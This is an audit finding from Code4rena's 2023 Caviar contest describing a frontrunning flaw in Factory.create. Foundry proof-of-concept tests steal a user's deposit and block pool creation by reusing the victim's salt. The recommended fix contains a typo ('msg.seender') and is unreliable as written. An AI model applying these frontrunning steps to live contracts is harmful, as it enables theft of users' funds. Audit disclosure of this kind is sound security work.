---
# Core Classification
protocol: Caviar
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 16256
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2023-04-caviar-private-pools
source_link: https://code4rena.com/reports/2023-04-caviar
github_link: https://github.com/code-423n4/2023-04-caviar-findings/issues/419

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.80
financial_impact: medium

# Scoring
quality_score: 4
rarity_score: 4

# Context Tags
tags:

protocol_categories:
  - dexes
  - cdp
  - services
  - cross_chain
  - indexes

# Audit Details
report_date: unknown
finders_count: 21
finders:
  - philogy
  - yixxas
  - Dug
  - ladboy233
  - 0xTheC0der
---

## Vulnerability Title

[M-11] Factory.create: Predictability of pool address creates multiple issues.

### Overview


This bug report is about an issue with the `Factory.create` function in the code-423n4/2023-04-caviar repository on GitHub. The function is responsible for creating new `PrivatePool`s, and the address of the new PrivatePool depends solely upon the `_salt` parameter provided by the user. This public readability of `_salt` parameter creates two issues. 

The first issue is that if a user intends to create new pool and deposit some funds in it, an attacker can frontrun the user's txns and capture the deposit amounts. The second issue is that if a user intends to create a PrivatePool, their create txn can be forcefully reverted by an attacker by deploying a pool for themselves using the user's salt. This can be repeated again and again resulting in a denial of service for the `Factory.create` function.

The Foundry tool was used to test these issues. The recommended mitigation step is to make the upcoming pool address user specific by combining the salt value with the user's address.

### Original Finding Content

## Lines of code

https://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L92


## Vulnerability details

## Impact
The `Factory.create` function is responsible for creating new `PrivatePool`s. It does this using the `LibClone.cloneDeterministic` function.

```solidity
    function create(
        ...
        bytes32 _salt,
        ...
    ) public payable returns (PrivatePool privatePool) {
        if ((_baseToken == address(0) && msg.value != baseTokenAmount) || (_baseToken != address(0) && msg.value > 0)) {
            revert PrivatePool.InvalidEthAmount();
        }

        // deploy a minimal proxy clone of the private pool implementation
        privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));

        // ...
    }
```

The address of the new PrivatePool depends solely upon the `_salt` parameter provided by the user. Once the user's create transaction is broadcasted, the  `_salt` parameter can be viewed by anyone watching the public mempool.

This public readability of `_salt` parameter creates two issues:

1. Stealing of user's deposit amount.
If a user intends to create new pool and deposit some funds in it then an attacker can frontrun the user's txns and capture the deposit amounts. Here is how this can happen:
     - User broadcasts two txns, first one to create a pool with `XXX` as the salt and second one to deposit some ETH into the new pool.
     - The attacker views these pending txns and frontruns them to create a PrivatePool for himself with same `XXX` salt.
     - The new pool gets created for the attacker, the address of this pool will be same as what the user will be expecting for his pool.
     - The user's create pool txn gets reverted but deposit txn gets executed successfully. Hence the user deposited ETH in  attacker's pool.
     - Being the owner of the pool the attacker simply withdraws the deposited ETH from the PrivatePool.

2. DoS for `Factory.create`.
If a user intends to create a PrivatePool, his create txn can be forcefully reverted by an attacker by deploying a pool for himself using the user's salt. Here is how this can happen:
    - The user broadcasts the create pool txn with salt `XXX`.
    - The attacker frontruns the user's txn and creates a pool for hiself using the same `XXX` salt.
    - The user's original create txn gets reverted as attacker's pool already exist on the predetermined address.
    - This attack can be repeated again and again resulting in DoS for the `Factory.create` function.

## Proof of Concept
These test cases were added to `test/PrivatePool/Withdraw.t.sol` file and were ran using `forge test --ffi --mp test/PrivatePool/Withdraw.t.sol --mt test_audit`

```solidity
    function test_audit_create_stealDeposit() public {
        address user1 = makeAddr("user1");
        vm.deal(user1, 10 ether);
        vm.startPrank(user1);

        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));

        // tries to create pool and deposit funds
        // 1. factory.create(...)
        // 2. pool.deposit(...)

        // but user2 frontruns the txns

        address user2 = makeAddr("user2");
        changePrank(user2);

        uint baseTokenAmount = 0;

        PrivatePool pool = factory.create{value: baseTokenAmount}(
            baseToken,
            nft,
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true,
            false,
            bytes32(0),
            tokenIds,
            baseTokenAmount
        );
        assertEq(predictedAddress, address(pool));
        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));

        changePrank(user1);

        vm.expectRevert(LibClone.DeploymentFailed.selector);
        factory.create{value: baseTokenAmount}(
            baseToken,
            nft,
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true,
            false,
            bytes32(0),
            tokenIds,
            baseTokenAmount
        );

        pool.deposit{ value: 10 ether }(tokenIds, 10 ether);
        assertEq(address(pool).balance, 10 ether);

        changePrank(user2);
        pool.withdraw(address(0), tokenIds, address(0), 10 ether);
        assertEq(address(pool).balance, 0);
        assertEq(user2.balance, 10 ether);
    }

    function test_audit_create_DoS() public {
        address user1 = makeAddr("user1");
        vm.deal(user1, 10 ether);
        vm.startPrank(user1);

        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));

        // user1 tries to create pool
        // factory.create(...)

        // but user2 frontruns the txn

        address user2 = makeAddr("user2");
        changePrank(user2);

        uint baseTokenAmount = 0;

        PrivatePool pool = factory.create{value: baseTokenAmount}(
            baseToken,
            nft,
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true,
            false,
            bytes32(0),
            tokenIds,
            baseTokenAmount
        );
        assertEq(predictedAddress, address(pool));
        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));

        changePrank(user1);

        vm.expectRevert(LibClone.DeploymentFailed.selector);
        factory.create{value: baseTokenAmount}(
            baseToken,
            nft,
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true,
            false,
            bytes32(0),
            tokenIds,
            baseTokenAmount
        );
    }
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Consider making the upcoming pool address user specific by combining the salt value with user's address.
```solidity
    privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(
        keccak256(abi.encode(msg.seender, _salt))
    )));
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 4/5 |
| Rarity Score | 4/5 |
| Audit Firm | Code4rena |
| Protocol | Caviar |
| Report Date | N/A |
| Finders | philogy, yixxas, Dug, ladboy233, 0xTheC0der, saian, dingo2077, juancito, hasmama, sashik_eth, GT_Blockchain, adriro, holyhansss_kr, AkshaySrivastav, said, fs0c, hihen, zion, Haipls, bin2chen, carlitox477 |

### Source Links

- **Source**: https://code4rena.com/reports/2023-04-caviar
- **GitHub**: https://github.com/code-423n4/2023-04-caviar-findings/issues/419
- **Contest**: https://code4rena.com/contests/2023-04-caviar-private-pools

### Keywords for Search

`vulnerability`

